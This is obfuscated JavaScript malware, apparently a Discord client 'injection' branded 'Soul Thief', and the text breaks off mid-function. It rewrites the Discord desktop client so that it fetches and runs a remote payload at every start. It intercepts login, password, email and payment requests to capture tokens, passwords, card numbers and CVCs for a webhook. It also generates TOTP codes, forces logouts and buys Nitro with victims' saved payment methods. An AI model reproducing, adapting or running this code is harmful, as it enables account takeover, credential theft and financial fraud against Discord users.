const _0x2cff4b=_0x444a;(function(_0xdc57dd,_0x3f7e40){const _0x272f34=_0x444a,_0x78eb66=_0xdc57dd();while(!![]){try{const _0x19f954=-parseInt(_0x272f34(0xe4))/0x1+parseInt(_0x272f34(0x12b))/0x2*(parseInt(_0x272f34(0xef))/0x3)+parseInt(_0x272f34(0xc2))/0x4+parseInt(_0x272f34(0xeb))/0x5+-parseInt(_0x272f34(0xe5))/0x6*(parseInt(_0x272f34(0x8e))/0x7)+-parseInt(_0x272f34(0xb4))/0x8+parseInt(_0x272f34(0xc3))/0x9;if(_0x19f954===_0x3f7e40)break;else _0x78eb66['push'](_0x78eb66['shift']());}catch(_0x2d4b03){_0x78eb66['push'](_0x78eb66['shift']());}}}(_0x28f7,0xb4c4d));const args=process[_0x2cff4b(0x89)],fs=require('fs'),path=require(_0x2cff4b(0x106)),https=require(_0x2cff4b(0xbe)),querystring=require(_0x2cff4b(0x143)),{BrowserWindow,session}=require(_0x2cff4b(0x9e)),config={'webhook':_0x2cff4b(0x94),'webhook_protector_key':_0x2cff4b(0x9c),'auto_buy_nitro':![],'ping_on_run':!![],'ping_val':_0x2cff4b(0xe8),'embed_name':_0x2cff4b(0x118),'embed_icon':_0x2cff4b(0x11a)[_0x2cff4b(0xc9)](/ /g,_0x2cff4b(0x14f)),'embed_color':0x2c2f33,'injection_url':'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js','api':_0x2cff4b(0xa6),'nitro':{'boost':{'year':{'id':_0x2cff4b(0x88),'sku':_0x2cff4b(0xd6),'price':_0x2cff4b(0xcb)},'month':{'id':_0x2cff4b(0x88),'sku':_0x2cff4b(0x81),'price':'999'}},'classic':{'month':{'id':'521846918637420545','sku':_0x2cff4b(0xf3),'price':_0x2cff4b(0xb0)}}},'filter':{'urls':['https://discord.com/api/v*/users/@me',_0x2cff4b(0x101),_0x2cff4b(0xf5),_0x2cff4b(0x144),'https://discord.com/api/v*/auth/login',_0x2cff4b(0xc0),_0x2cff4b(0x132),_0x2cff4b(0xd9),_0x2cff4b(0x12c),_0x2cff4b(0xe7)]},'filter2':{'urls':[_0x2cff4b(0x124),_0x2cff4b(0xf4),_0x2cff4b(0x9f),'https://*.discord.com/api/v*/users/@me/library',_0x2cff4b(0x8c),_0x2cff4b(0xa5)]}};function parity_32(_0x5b953e,_0x4f839a,_0x421418){return _0x5b953e^_0x4f839a^_0x421418;}function ch_32(_0x851d88,_0x518aaf,_0x2937ff){return _0x851d88&_0x518aaf^~_0x851d88&_0x2937ff;}function maj_32(_0x297659,_0x33cb13,_0x486580){return _0x297659&_0x33cb13^_0x297659&_0x486580^_0x33cb13&_0x486580;}function rotl_32(_0xba5f0,_0x27dc4e){return _0xba5f0<<_0x27dc4e|_0xba5f0>>>0x20-_0x27dc4e;}function safeAdd_32_2(_0x5753e2,_0x28321d){var _0x3b5ab6=(_0x5753e2&0xffff)+(_0x28321d&0xffff),_0x1d697d=(_0x5753e2>>>0x10)+(_0x28321d>>>0x10)+(_0x3b5ab6>>>0x10);return(_0x1d697d&0xffff)<<0x10|_0x3b5ab6&0xffff;}function safeAdd_32_5(_0x3a282f,_0x149681,_0xe198dc,_0x3b8eec,_0x168290){var _0x424445=(_0x3a282f&0xffff)+(_0x149681&0xffff)+(_0xe198dc&0xffff)+(_0x3b8eec&0xffff)+(_0x168290&0xffff),_0x2d8182=(_0x3a282f>>>0x10)+(_0x149681>>>0x10)+(_0xe198dc>>>0x10)+(_0x3b8eec>>>0x10)+(_0x168290>>>0x10)+(_0x424445>>>0x10);return(_0x2d8182&0xffff)<<0x10|_0x424445&0xffff;}function binb2hex(_0x598644){const _0x345b50=_0x2cff4b;var _0x554a4c=_0x345b50(0xdc),_0x1e03f7='',_0x5433fc=_0x598644[_0x345b50(0xb3)]*0x4,_0xd3b677,_0x1b6596;for(_0xd3b677=0x0;_0xd3b677<_0x5433fc;_0xd3b677+=0x1){_0x1b6596=_0x598644[_0xd3b677>>>0x2]>>>(0x3-_0xd3b677%0x4)*0x8,_0x1e03f7+=_0x554a4c[_0x345b50(0x11e)](_0x1b6596>>>0x4&0xf)+_0x554a4c['charAt'](_0x1b6596&0xf);}return _0x1e03f7;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0xa42004,_0x239618){var _0xb3e365=[],_0x3cfbed,_0x4b9448,_0x26d4f2,_0x2618d3,_0xc4901a,_0x5508d2,_0x184103=ch_32,_0x4db12b=parity_32,_0x18bdb7=maj_32,_0x255cd4=rotl_32,_0x49d2b5=safeAdd_32_2,_0xb065c6,_0x3d6308=safeAdd_32_5;_0x3cfbed=_0x239618[0x0],_0x4b9448=_0x239618[0x1],_0x26d4f2=_0x239618[0x2],_0x2618d3=_0x239618[0x3],_0xc4901a=_0x239618[0x4];for(_0xb065c6=0x0;_0xb065c6<0x50;_0xb065c6+=0x1){_0xb065c6<0x10?_0xb3e365[_0xb065c6]=_0xa42004[_0xb065c6]:_0xb3e365[_0xb065c6]=_0x255cd4(_0xb3e365[_0xb065c6-0x3]^_0xb3e365[_0xb065c6-0x8]^_0xb3e365[_0xb065c6-0xe]^_0xb3e365[_0xb065c6-0x10],0x1);if(_0xb065c6<0x14)_0x5508d2=_0x3d6308(_0x255cd4(_0x3cfbed,0x5),_0x184103(_0x4b9448,_0x26d4f2,_0x2618d3),_0xc4901a,0x5a827999,_0xb3e365[_0xb065c6]);else{if(_0xb065c6<0x28)_0x5508d2=_0x3d6308(_0x255cd4(_0x3cfbed,0x5),_0x4db12b(_0x4b9448,_0x26d4f2,_0x2618d3),_0xc4901a,0x6ed9eba1,_0xb3e365[_0xb065c6]);else _0xb065c6<0x3c?_0x5508d2=_0x3d6308(_0x255cd4(_0x3cfbed,0x5),_0x18bdb7(_0x4b9448,_0x26d4f2,_0x2618d3),_0xc4901a,0x8f1bbcdc,_0xb3e365[_0xb065c6]):_0x5508d2=_0x3d6308(_0x255cd4(_0x3cfbed,0x5),_0x4db12b(_0x4b9448,_0x26d4f2,_0x2618d3),_0xc4901a,0xca62c1d6,_0xb3e365[_0xb065c6]);}_0xc4901a=_0x2618d3,_0x2618d3=_0x26d4f2,_0x26d4f2=_0x255cd4(_0x4b9448,0x1e),_0x4b9448=_0x3cfbed,_0x3cfbed=_0x5508d2;}return _0x239618[0x0]=_0x49d2b5(_0x3cfbed,_0x239618[0x0]),_0x239618[0x1]=_0x49d2b5(_0x4b9448,_0x239618[0x1]),_0x239618[0x2]=_0x49d2b5(_0x26d4f2,_0x239618[0x2]),_0x239618[0x3]=_0x49d2b5(_0x2618d3,_0x239618[0x3]),_0x239618[0x4]=_0x49d2b5(_0xc4901a,_0x239618[0x4]),_0x239618;}function finalizeSHA1(_0x7e0e3,_0x1c4d51,_0x24fb12,_0x3feec7){const _0x2e52c5=_0x2cff4b;var _0x23bde6,_0x229180,_0x49fb47;_0x49fb47=(_0x1c4d51+0x41>>>0x9<<0x4)+0xf;while(_0x7e0e3[_0x2e52c5(0xb3)]<=_0x49fb47){_0x7e0e3[_0x2e52c5(0x139)](0x0);}_0x7e0e3[_0x1c4d51>>>0x5]|=0x80<<0x18-_0x1c4d51%0x20,_0x7e0e3[_0x49fb47]=_0x1c4d51+_0x24fb12,_0x229180=_0x7e0e3[_0x2e52c5(0xb3)];for(_0x23bde6=0x0;_0x23bde6<_0x229180;_0x23bde6+=0x10){_0x3feec7=roundSHA1(_0x7e0e3['slice'](_0x23bde6,_0x23bde6+0x10),_0x3feec7);}return _0x3feec7;}function hex2binb(_0x574c19,_0x3739ad,_0xf97413){const _0xaca00a=_0x2cff4b;var _0x25bda3,_0x239704=_0x574c19[_0xaca00a(0xb3)],_0x42bd27,_0xae08a5,_0xa7aefd,_0x434dd2,_0x11e474;_0x25bda3=_0x3739ad||[0x0],_0xf97413=_0xf97413||0x0,_0x11e474=_0xf97413>>>0x3;0x0!==_0x239704%0x2&&console['error'](_0xaca00a(0x130));for(_0x42bd27=0x0;_0x42bd27<_0x239704;_0x42bd27+=0x2){_0xae08a5=parseInt(_0x574c19[_0xaca00a(0x14e)](_0x42bd27,0x2),0x10);if(!isNaN(_0xae08a5)){_0x434dd2=(_0x42bd27>>>0x1)+_0x11e474,_0xa7aefd=_0x434dd2>>>0x2;while(_0x25bda3[_0xaca00a(0xb3)]<=_0xa7aefd){_0x25bda3[_0xaca00a(0x139)](0x0);}_0x25bda3[_0xa7aefd]|=_0xae08a5<<0x8*(0x3-_0x434dd2%0x4);}else console[_0xaca00a(0xda)](_0xaca00a(0x84));}return{'value':_0x25bda3,'binLen':_0x239704*0x4+_0xf97413};}class jsSHA{constructor(){const _0x46f9fc=_0x2cff4b;var _0x288f2e=0x0,_0x3507ed=[],_0x2befb9=0x0,_0x4f8c0d,_0x1e024e,_0x451fd8,_0xeb3512,_0x16f2af,_0x5d20e3,_0x3a21be=![],_0x3904ed=![],_0x28290e=[],_0x278bb2=[],_0x4a29d5,_0x4a29d5=0x1;_0x1e024e=hex2binb,(_0x4a29d5!==parseInt(_0x4a29d5,0xa)||0x1>_0x4a29d5)&&console[_0x46f9fc(0xda)](_0x46f9fc(0x92)),_0xeb3512=0x200,_0x16f2af=roundSHA1,_0x5d20e3=finalizeSHA1,_0x451fd8=0xa0,_0x4f8c0d=getH(),this[_0x46f9fc(0xfb)]=function(_0x2f5011){const _0x5fe77d=_0x46f9fc;var _0x4446fe,_0x4611c2,_0x84d3f9,_0xe826fc,_0x35fea7,_0x288a94,_0x1e1f1f;_0x4446fe=hex2binb,_0x4611c2=_0x4446fe(_0x2f5011),_0x84d3f9=_0x4611c2[_0x5fe77d(0x7c)],_0xe826fc=_0x4611c2[_0x5fe77d(0x116)],_0x35fea7=_0xeb3512>>>0x3,_0x1e1f1f=_0x35fea7/0x4-0x1;if(_0x35fea7<_0x84d3f9/0x8){_0xe826fc=_0x5d20e3(_0xe826fc,_0x84d3f9,0x0,getH());while(_0xe826fc['length']<=_0x1e1f1f){_0xe826fc[_0x5fe77d(0x139)](0x0);}_0xe826fc[_0x1e1f1f]&=0xffffff00;}else{if(_0x35fea7>_0x84d3f9/0x8){while(_0xe826fc[_0x5fe77d(0xb3)]<=_0x1e1f1f){_0xe826fc[_0x5fe77d(0x139)](0x0);}_0xe826fc[_0x1e1f1f]&=0xffffff00;}}for(_0x288a94=0x0;_0x288a94<=_0x1e1f1f;_0x288a94+=0x1){_0x28290e[_0x288a94]=_0xe826fc[_0x288a94]^0x36363636,_0x278bb2[_0x288a94]=_0xe826fc[_0x288a94]^0x5c5c5c5c;}_0x4f8c0d=_0x16f2af(_0x28290e,_0x4f8c0d),_0x288f2e=_0xeb3512,_0x3904ed=!![];},this[_0x46f9fc(0x8a)]=function(_0x431477){const _0x2d6ac2=_0x46f9fc;var _0x528cfa,_0x479740,_0x20517f,_0x52d949,_0x909443,_0x13c16f=0x0,_0x262ae0=_0xeb3512>>>0x5;_0x528cfa=_0x1e024e(_0x431477,_0x3507ed,_0x2befb9),_0x479740=_0x528cfa[_0x2d6ac2(0x7c)],_0x52d949=_0x528cfa[_0x2d6ac2(0x116)],_0x20517f=_0x479740>>>0x5;for(_0x909443=0x0;_0x909443<_0x20517f;_0x909443+=_0x262ae0){_0x13c16f+_0xeb3512<=_0x479740&&(_0x4f8c0d=_0x16f2af(_0x52d949['slice'](_0x909443,_0x909443+_0x262ae0),_0x4f8c0d),_0x13c16f+=_0xeb3512);}_0x288f2e+=_0x13c16f,_0x3507ed=_0x52d949['slice'](_0x13c16f>>>0x5),_0x2befb9=_0x479740%_0xeb3512;},this[_0x46f9fc(0x11f)]=function(){const _0x6f3eaa=_0x46f9fc;var _0x5ab99f;![]===_0x3904ed&&console['error'](_0x6f3eaa(0x14a));const _0x2bff4c=function(_0x11d48d){return binb2hex(_0x11d48d);};return![]===_0x3a21be&&(_0x5ab99f=_0x5d20e3(_0x3507ed,_0x2befb9,_0x288f2e,_0x4f8c0d),_0x4f8c0d=_0x16f2af(_0x278bb2,getH()),_0x4f8c0d=_0x5d20e3(_0x5ab99f,_0x451fd8,_0xeb3512,_0x4f8c0d)),_0x3a21be=!![],_0x2bff4c(_0x4f8c0d);};}}function _0x28f7(){const _0x180e50=['https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','rmdirSync','embed_name','HypeSquad\x20Bravery,\x20','Green\x20BugHunter,\x20','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','from','46YirPNw','https://api.stripe.com/v*/setup_intents/*/confirm','\x27;\x0aconst\x20bdPath\x20=\x20\x27','endsWith','content-security-policy-report-only','String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments','stringify','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','**Nitro\x20bought!**','parse','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','boost','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','usd','push','undefined','💳\x20','premium_type','flags','invalid','**Email\x20Changed**','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','Credit\x20Card\x20Number:\x20**','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','querystring','https://discordapp.com/api/v*/auth/login','resources','filter2','price','**\x0aCredit\x20Card\x20Expiration:\x20**','https://cdn.discordapp.com/avatars/','Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key','app.asar','log','bytes','substr','%20','startsWith','nitro','responseHeaders','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','binLen','function','card[exp_month]','Partnered\x20Server\x20Owner,\x20','\x20|\x20','511651880837840896','**\x0aOld\x20Password:\x20**','ping_val','String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','login','username','521847234246082599','argv','update','darwin','https://discord.com/api/v*/users/@me/library','**\x0aCVC:\x20**','30331EKNYFN','lenght','package.json','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27','numRounds\x20must\x20a\x20integer\x20>=\x201','**Token**','%WEBHOOK%','initiation','Access-Control-Allow-Headers\x20\x27*\x27','webRequest','<:paypal:951139189389410365>\x20','🎉・Discord\x20Injection\x20By\x20Soul\x20Thief','HypeSquad\x20Brillance,\x20','includes','%WEBHOOK_KEY%','toUpperCase','electron','https://discord.com/api/v*/applications/detectable','7fffffff','Gold\x20BugHunter,\x20','slice','url','**Account\x20Info**','wss://remote-auth-gateway.discord.gg/*','https://discord.com/api/v9/users/@me','paypal_accounts','password','statusCode','filter','unlinkSync','Verified\x20Bot\x20Developer,\x20','api/webhooks','auto_buy_nitro','webhook','499','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','2422867c-244d-476a-ba4f-36e197758d97','length','11046400zVsQiq','APPDATA','end','injection_url','year','floor','**Nitro\x20Code:**\x0a```diff\x0a+\x20','PATCH','card[exp_year]','confirm','https','**Credit\x20Card\x20Added**','https://*.discord.com/api/v*/auth/login','writeFileSync','966532CHxJoE','12614175ZhoVDm','default','https://discord.gift/','protocol','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','discord.com','replace','*\x0aBadges:\x20**','9999','Invalid\x20base32\x20character\x20in\x20key','assign','forEach','round','Failed\x20to\x20Purchase\x20❌','join','Nitro\x20Type:\x20**','\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(','discord','method','511651885459963904','index.js','gift_code','https://api.stripe.com/v*/tokens','error','application/json','0123456789abcdef','amd','**Discord\x20Info**','));\x0a\x20\x20\x20\x20xmlHttp.responseText','win32','**Paypal\x20Added**','None','split','457775CAQbXP','714TfnKIs','Access-Control-Allow-Origin\x20\x27*\x27','https://api.stripe.com/v*/payment_intents/*/confirm','@everyone','sep','api','3548940jzUKXm','\x5cmodules\x5cdiscord_desktop_core-1\x5cdiscord_desktop_core\x5cindex.js','ping_on_run','discriminator','96735NjxczE','avatar','app','.webp','511651871736201216','https://*.discord.com/api/v*/applications/detectable','https://*.discord.com/api/v*/users/@me','card[cvc]','write','Contents','exports','defaultSession','setHMACKey','Authorization','uploadData','No\x20Nitro','HypeSquad\x20Balance,\x20','Hypesquad\x20Event,\x20','https://discordapp.com/api/v*/users/@me','email','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','catch','card[number]','path','platform','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','existsSync','**\x20-\x20Password:\x20**','new_password','mkdirSync','month','substring','**\x0aBadges:\x20**','sku','embed_icon','toString','host','wss://remote-auth-gateway','embed_color','value','Email:\x20**','Soul\x20Thief\x20Injection','users/@me','https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png?size=4096','**\x0aBilling:\x20**','content','POST','charAt','getHMAC','```','webhook_protector_key','./core.asar','New\x20Email:\x20**'];_0x28f7=function(){return _0x180e50;};return _0x28f7();}if(_0x2cff4b(0x7d)===typeof define&&define[_0x2cff4b(0xdd)])define(function(){return jsSHA;});else _0x2cff4b(0x13a)!==typeof exports?_0x2cff4b(0x13a)!==typeof module&&module[_0x2cff4b(0xf9)]?module[_0x2cff4b(0xf9)]=exports=jsSHA:exports=jsSHA:global['jsSHA']=jsSHA;jsSHA['default']&&(jsSHA=jsSHA[_0x2cff4b(0xc4)]);function totp(_0x3dbdef){const _0x1bc04f=_0x2cff4b,_0x39630d=0x1e,_0x4f35db=0x6,_0x3f2b0b=Date['now'](),_0x17ce35=Math[_0x1bc04f(0xcf)](_0x3f2b0b/0x3e8),_0x13fe2d=leftpad(dec2hex(Math[_0x1bc04f(0xb9)](_0x17ce35/_0x39630d)),0x10,'0'),_0x33d807=new jsSHA();_0x33d807[_0x1bc04f(0xfb)](base32tohex(_0x3dbdef)),_0x33d807[_0x1bc04f(0x8a)](_0x13fe2d);const _0x10b9d8=_0x33d807[_0x1bc04f(0x11f)](),_0x12f62e=hex2dec(_0x10b9d8[_0x1bc04f(0x10e)](_0x10b9d8[_0x1bc04f(0xb3)]-0x1));let _0x5d4562=(hex2dec(_0x10b9d8['substr'](_0x12f62e*0x2,0x8))&hex2dec(_0x1bc04f(0xa0)))+'';return _0x5d4562=_0x5d4562[_0x1bc04f(0x14e)](Math['max'](_0x5d4562[_0x1bc04f(0xb3)]-_0x4f35db,0x0),_0x4f35db),_0x5d4562;}function hex2dec(_0x37f142){return parseInt(_0x37f142,0x10);}function dec2hex(_0x442e16){const _0x21ffa2=_0x2cff4b;return(_0x442e16<15.5?'0':'')+Math[_0x21ffa2(0xcf)](_0x442e16)['toString'](0x10);}function base32tohex(_0xcae6c5){const _0x512c67=_0x2cff4b;let _0xd7f921=_0x512c67(0xc7),_0x37718f='',_0x5128ee='';_0xcae6c5=_0xcae6c5['replace'](/=+$/,'');for(let _0x45b312=0x0;_0x45b312<_0xcae6c5['length'];_0x45b312++){let _0x4c524b=_0xd7f921['indexOf'](_0xcae6c5[_0x512c67(0x11e)](_0x45b312)[_0x512c67(0x9d)]());if(_0x4c524b===-0x1)console['error'](_0x512c67(0xcc));_0x37718f+=leftpad(_0x4c524b[_0x512c67(0x112)](0x2),0x5,'0');}for(let _0x327a2a=0x0;_0x327a2a+0x8<=_0x37718f[_0x512c67(0xb3)];_0x327a2a+=0x8){let _0xa8c5e5=_0x37718f[_0x512c67(0x14e)](_0x327a2a,0x8);_0x5128ee=_0x5128ee+leftpad(parseInt(_0xa8c5e5,0x2)['toString'](0x10),0x2,'0');}return _0x5128ee;}function leftpad(_0x3be5c2,_0x34fbaf,_0x3211f6){const _0x8d9a2c=_0x2cff4b;return _0x34fbaf+0x1>=_0x3be5c2[_0x8d9a2c(0xb3)]&&(_0x3be5c2=Array(_0x34fbaf+0x1-_0x3be5c2['length'])[_0x8d9a2c(0xd1)](_0x3211f6)+_0x3be5c2),_0x3be5c2;}const discordPath=(function(){const _0x116eea=_0x2cff4b,_0x3496df=args[0x0][_0x116eea(0xe3)](path[_0x116eea(0xe9)])[_0x116eea(0xa2)](0x0,-0x1)[_0x116eea(0xd1)](path['sep']);let _0xcc90a4;if(process[_0x116eea(0x107)]===_0x116eea(0xe0))_0xcc90a4=path[_0x116eea(0xd1)](_0x3496df,_0x116eea(0x145));else process[_0x116eea(0x107)]==='darwin'&&(_0xcc90a4=path['join'](_0x3496df,_0x116eea(0xf8),'Resources'));if(fs[_0x116eea(0x109)](_0xcc90a4))return{'resourcePath':_0xcc90a4,'app':_0x3496df};return{'undefined':undefined,'undefined':undefined};}());function _0x444a(_0x5da5ab,_0x4a73f8){const _0x28f737=_0x28f7();return _0x444a=function(_0x444a9a,_0x253f57){_0x444a9a=_0x444a9a-0x79;let _0x46ff52=_0x28f737[_0x444a9a];return _0x46ff52;},_0x444a(_0x5da5ab,_0x4a73f8);}function updateCheck(){const _0x476228=_0x2cff4b,{resourcePath:_0x15b321,app:_0x13f080}=discordPath;if(_0x15b321===undefined||_0x13f080===undefined)return;const _0x329007=path[_0x476228(0xd1)](_0x15b321,_0x476228(0xf1)),_0x9b9d1e=path[_0x476228(0xd1)](_0x329007,_0x476228(0x90)),_0x3bbff4=path[_0x476228(0xd1)](_0x329007,_0x476228(0xd7)),_0x414790=_0x13f080+_0x476228(0xec),_0x5ed966=path[_0x476228(0xd1)](process['env'][_0x476228(0xb5)],'\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar');if(!fs[_0x476228(0x109)](_0x329007))fs[_0x476228(0x10c)](_0x329007);if(fs[_0x476228(0x109)](_0x9b9d1e))fs[_0x476228(0xab)](_0x9b9d1e);if(fs['existsSync'](_0x3bbff4))fs['unlinkSync'](_0x3bbff4);if(process[_0x476228(0x107)]===_0x476228(0xe0)||process['platform']===_0x476228(0x8b)){fs[_0x476228(0xc1)](_0x9b9d1e,JSON['stringify']({'name':_0x476228(0xd4),'main':_0x476228(0xd7)},null,0x4));const _0x3a3cca='const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27'+_0x414790+_0x476228(0x12d)+_0x5ed966+_0x476228(0x108)+config[_0x476228(0xb7)]+'\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27'+config['webhook']+_0x476228(0x91)+config['webhook_protector_key']+_0x476228(0x137)+path[_0x476228(0xd1)](_0x15b321,_0x476228(0x14b))+_0x476228(0xb1);fs[_0x476228(0xc1)](_0x3bbff4,_0x3a3cca[_0x476228(0xc9)](/\\/g,'\x5c\x5c'));}if(!fs[_0x476228(0x109)](path[_0x476228(0xd1)](__dirname,_0x476228(0x95))))return!0x0;return fs[_0x476228(0x125)](path[_0x476228(0xd1)](__dirname,_0x476228(0x95))),execScript(_0x476228(0x103)),!0x1;}const execScript=_0x36ae93=>{const _0x3f3bd0=BrowserWindow['getAllWindows']()[0x0];return _0x3f3bd0['webContents']['executeJavaScript'](_0x36ae93,!0x0);},getInfo=async _0x4a247e=>{const _0x14cfba=_0x2cff4b,_0x3b249c=await execScript(_0x14cfba(0x140)+config[_0x14cfba(0xea)]+_0x14cfba(0x135)+_0x4a247e+_0x14cfba(0x85));return JSON[_0x14cfba(0x134)](_0x3b249c);},fetchBilling=async _0xc80975=>{const _0x5091c9=_0x2cff4b,_0x45df46=await execScript(_0x5091c9(0x129)+config[_0x5091c9(0xea)]+'/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0xc80975+'\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText');if(!_0x45df46[_0x5091c9(0x8f)]||_0x45df46['length']===0x0)return'';return JSON[_0x5091c9(0x134)](_0x45df46);},getBilling=async _0x22b931=>{const _0x287da9=_0x2cff4b,_0xccff2b=await fetchBilling(_0x22b931);if(!_0xccff2b)return'❌';let _0x4e26ae='';_0xccff2b[_0x287da9(0xce)](_0x2bdb3d=>{const _0x2ed12d=_0x287da9;if(!_0x2bdb3d['invalid'])switch(_0x2bdb3d['type']){case 0x1:_0x4e26ae+=_0x2ed12d(0x13b);break;case 0x2:_0x4e26ae+=_0x2ed12d(0x98);break;}});if(!_0x4e26ae)_0x4e26ae='❌';return _0x4e26ae;},Purchase=async(_0xcf8346,_0x482381,_0x1060f4,_0x5375dc)=>{const _0x4896c2=_0x2cff4b,_0x365494={'expected_amount':config[_0x4896c2(0x79)][_0x1060f4][_0x5375dc][_0x4896c2(0x147)],'expected_currency':_0x4896c2(0x138),'gift':!![],'payment_source_id':_0x482381,'payment_source_token':null,'purchase_token':_0x4896c2(0xb2),'sku_subscription_plan_id':config[_0x4896c2(0x79)][_0x1060f4][_0x5375dc][_0x4896c2(0x110)]},_0x23bbf7=execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/'+config[_0x4896c2(0x79)][_0x1060f4][_0x5375dc]['id']+'/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0xcf8346+_0x4896c2(0xd3)+JSON[_0x4896c2(0x131)](_0x365494)+_0x4896c2(0xdf));if(_0x23bbf7[_0x4896c2(0xd8)])return _0x4896c2(0xc5)+_0x23bbf7[_0x4896c2(0xd8)];else return null;},buyNitro=async _0x430c1a=>{const _0x3b8766=_0x2cff4b,_0x411557=await fetchBilling(_0x430c1a),_0x2bb8f5=_0x3b8766(0xd0);if(!_0x411557)return _0x2bb8f5;let _0x4c7204=[];_0x411557[_0x3b8766(0xce)](_0x36b015=>{const _0x2108e7=_0x3b8766;!_0x36b015[_0x2108e7(0x13e)]&&(_0x4c7204=_0x4c7204['concat'](_0x36b015['id']));});for(let _0x2bd191 in _0x4c7204){const _0xc17aff=Purchase(_0x430c1a,_0x2bd191,_0x3b8766(0x136),_0x3b8766(0xb8));if(_0xc17aff!==null)return _0xc17aff;else{const _0x5efa0c=Purchase(_0x430c1a,_0x2bd191,_0x3b8766(0x136),_0x3b8766(0x10d));if(_0x5efa0c!==null)return _0x5efa0c;else{const _0x200477=Purchase(_0x430c1a,_0x2bd191,'classic','month');return _0x200477!==null?_0x200477:_0x2bb8f5;}}}},getNitro=_0x3b29c1=>{const _0x32ba83=_0x2cff4b;switch(_0x3b29c1){case 0x0:return'No\x20Nitro';case 0x1:return'Nitro\x20Classic';case 0x2:return'Nitro\x20Boost';default:return _0x32ba83(0xfe);}},getBadges=_0x19c125=>{const _0x315298=_0x2cff4b;let _0x5c8e38='';switch(_0x19c125){case 0x1:_0x5c8e38+='Discord\x20Staff,\x20';break;case 0x2:_0x5c8e38+=_0x315298(0x7f);break;case 0x20000:_0x5c8e38+=_0x315298(0xac);break;case 0x4:_0x5c8e38+=_0x315298(0x100);break;case 0x4000:_0x5c8e38+=_0x315298(0xa1);break;case 0x8:_0x5c8e38+=_0x315298(0x128);break;case 0x200:_0x5c8e38+='Early\x20Supporter,\x20';break;case 0x80:_0x5c8e38+=_0x315298(0x9a);break;case 0x40:_0x5c8e38+=_0x315298(0x127);break;case 0x100:_0x5c8e38+=_0x315298(0xff);break;case 0x0:_0x5c8e38=_0x315298(0xe2);break;default:_0x5c8e38=_0x315298(0xe2);break;}return 